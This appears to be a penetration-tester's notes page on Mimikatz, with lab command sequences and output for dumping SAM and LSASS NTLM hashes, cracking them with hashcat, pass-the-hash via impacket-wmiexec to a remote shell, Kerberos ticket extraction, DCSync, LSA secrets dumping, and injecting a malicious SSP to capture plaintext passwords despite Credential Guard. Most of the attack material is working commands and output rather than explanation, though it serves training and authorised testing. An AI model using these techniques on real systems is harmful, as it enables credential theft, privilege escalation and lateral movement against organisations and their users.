---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Mimikatz

> _Each command in `mimikatz` consists of a module and a command delimited by two colons (`module::command`)._&#x20;

## SAM

**NTML** stores unsalted hashed passwords in **SAM** database (`c:\windows\system32\config\sam`) which cannot be copied while the Windows OS is running.  **Local Security Authority System (LSASS)** runs with `SYSTEM` privileges and caches NTLM hashes.

1. We can extract the NTML hashes if we have `Administrator` / `SYSTEM` privileges and the `SeDebugPrivilege` access right enabled. We can enable the latter with `privilege::debug`.
2. We can use `token::elevate` module to elevate our privileges to `SYSTEM` if we have the `SeImpersonatePrivilege` access right. All local `administrators` have it by default.

{% tabs %}
{% tab title="1. SeDebugPrivilege" %}
```powershell
mimikatz # privilege::debug
Privilege '20' OK
```
{% endtab %}

{% tab title="2. PrivEsc" %}
{% code overflow="wrap" %}
```powershell
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

660     {0;000003e7} 1 D 41815          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;001035c2} 2 F 1710035     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 1981690     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```
{% endcode %}
{% endtab %}

{% tab title="3. Dump SAM" %}
```powershell
mimikatz # lsadump::sam
<SNIP>

RID  : 000003ea (1002)
User : nelly
  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10

<SNIP>
```
{% endtab %}

{% tab title="4. Crack" %}
{% code overflow="wrap" %}
```bash
hashcat -m1000 nelly_ntml /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Kerberos Tickets

```powershell
# Extract TGTs and TGSs
mimikatz # sekurlsa::tickets
```

## Pass-the-Hash

Unlike local account hashes which are stored in SAM, **domain hashes** are stored in memory of the Local Security Authority Subsystem Service process (`lsass.exe`).

{% tabs %}
{% tab title="1. SeDebugPrivilege" %}
```powershell
mimikatz # privilege::debug
Privilege '20' OK
```
{% endtab %}

{% tab title="2. LSASS" %}
```powershell
mimikatz # sekurlsa::logonpasswords
<SNIP>

Authentication Id : 0 ; 5468350 (00000000:005370be)
Session           : RemoteInteractive from 5
User Name         : Administrator
Domain            : CORP
Logon Server      : SERVERWK248
Logon Time        : 9/19/2024 2:08:28 AM
SID               : S-1-5-21-1711441587-1152167230-1972296030-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
         * NTLM     : 160c0b16dd0ee77e7c494e38252f7ddf
<SNIP>
```
{% endtab %}

{% tab title="3. PtH" %}
{% code overflow="wrap" %}
```bash
# with the domain's admin hash, we can perform a PtH attack.
$ impacket-wmiexec -debug -hashes :160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] SMBv3.0 dialect used
[+] Target system is 192.168.50.248 and isFQDN is False
[+] StringBinding: SERVERWK248[64285]
[+] StringBinding: 192.168.50.248[64285]
[+] StringBinding chosen: ncacn_ip_tcp:192.168.50.248[64285]
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```
{% endcode %}
{% endtab %}
{% endtabs %}

## SSP Injection

Credential Guard uses Virtualization-Based Security (VBS) to protect credentials by isolating them in a secure environment. VBS creates protected memory regions that the OS cannot access, enforced by Virtual Trust Levels (VTLs). VTL0 hosts the regular Windows environment, while VTL1 runs critical security functions.&#x20;

When enabled, **Credential Guard** **moves credential storage from LSASS to an isolated process (`LSAISO.exe`) in VTL1, communicating with LSASS in VTL0**. This prevents tools like Mimikatz, operating in VTL0, from accessing credential data. Introduced in Windows 10 and Server 2016, it is now enabled by default on modern Windows installations, though older systems may have it disabled.

> _**Credential Guard is only designed to protect non-local users**. This means that we are still able to obtain NTLM hashes for the local users on the target machine._

If we repeat the above PtH attack, and Credential Guard is enabled, we won't be able to get the domain's `Administrator` hash. While we know the `Administrator` user of the `CORP.COM` domain has logged into this box, we can't obtain the cached hashes because **the** `LSASS` **process only has access to this information after it has been encrypted by the** `LSAISO` **process**.

{% code overflow="wrap" %}
```powershell
mimikatz # sekurlsa::logonpasswords
...
Authentication Id : 0 ; 4214404 (00000000:00404e84)
Session           : RemoteInteractive from 4
User Name         : Administrator
Domain            : CORP
Logon Server      : SERVERWK248
Logon Time        : 9/19/2024 4:39:07 AM
SID               : S-1-5-21-1711441587-1152167230-1972296030-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
           * LSA Isolated Data: NtlmHash
             KdfContext: 7862d5bf49e0d0acee2bfb233e6e5ca6456cd38d5bbd5cc04588fbd24010dd54
             Tag       : 04fe7ed60e46f7cc13c6c5951eb8db91
             AuthData  : 0100000000000000000000000000000001000000340000004e746c6d48617368
             Encrypted : 6ad536994213cea0d0b4ff783b8eeb51e5a156e058a36e9dfa8811396e15555d40546e8e1941cbfc32e8905ff705181214f8ec5c
```
{% endcode %}

To bypass Credential Guard, attackers **intercept credentials during login instead of retrieving cached ones**. Windows authentication uses the Security Support Provider Interface (SSPI) with providers like Kerberos and NTLM. By registering a malicious SSP via the registry or injecting it into LSASS, attackers can capture plaintext credentials as they pass through SSPI. Mimikatzâ€™s `memssp` module automates this by injecting an SSP into LSASS memory, capturing credentials without writing files to disk.

```powershell
mimikatz # misc::memssp
Injected =)
```

At this point, when another user remotely connects to the machine their credentials will be captured.

```powershell
> type C:\Windows\System32\mimilsa.log
<SNIP>
[00000000:0066608e] CORP\Administrator  QWERTY123!@#
<SNIP>
```

## Other

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\administrator"'
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::secrets" "exit"'
# Using the binary
.\mimikatz.exe privilege::debug token::elevate lsadump::secrets exit 
```
{% endcode %}

## Resources

{% tabs %}
{% tab title="mimikatz.exe" %}
{% embed url="https://github.com/gentilkiwi/mimikatz/" %}
{% endtab %}

{% tab title="Invoke-Mimikatz.ps1" %}
{% embed url="https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1" %}
{% endtab %}

{% tab title="Guide" %}
{% embed url="https://adsecurity.org/?page_id=1821" %}
{% endtab %}
{% endtabs %}
